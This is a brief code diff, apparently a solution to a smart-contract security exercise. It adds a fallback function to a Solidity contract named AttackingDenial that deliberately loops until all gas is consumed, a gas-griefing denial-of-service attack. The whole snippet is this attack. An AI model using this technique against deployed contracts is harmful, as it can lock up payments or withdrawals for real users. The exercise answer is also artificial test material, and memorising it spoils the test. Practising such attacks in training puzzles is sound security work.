@@ -10,4 +10,8 @@ contract AttackingDenial {
     }
 
     //Code me!
+    fallback() external payable {
+        uint256 counter = 0;
+        while(gasleft() > 0) counter++;
+    }
 }
